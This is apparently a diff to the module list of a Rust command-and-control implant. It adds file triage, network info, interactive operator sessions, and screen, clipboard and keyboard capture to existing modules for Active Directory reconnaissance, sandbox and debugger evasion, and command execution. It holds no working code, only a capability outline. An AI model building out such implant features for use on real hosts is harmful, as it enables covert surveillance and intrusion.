@@ -15,6 +15,10 @@
 //!   domain   active directory reconnaissance
 //!   evade    debugger and sandbox awareness
 //!   task     command execution
+//!   triage   file triage and search
+//!   netinfo  the network configuration of the host
+//!   sessions interactive sessions (a process the operator writes to)
+//!   desktop the screen, the clipboard and the keyboard
 //!   beacon   the actual loop
 
 pub mod beacon;
@@ -25,14 +29,18 @@ pub mod dns;
 pub mod domain;
 pub mod evade;
 pub mod link;
+pub mod netinfo;
 pub mod post;
 pub mod session;
+pub mod sessions;
 pub mod sysinfo;
 pub mod task;
 pub mod transport;
+pub mod triage;
 pub mod tunnel;
 pub mod upk;
 pub mod vpn;
+pub mod desktop;
 pub mod ws;
 pub mod wire;
 
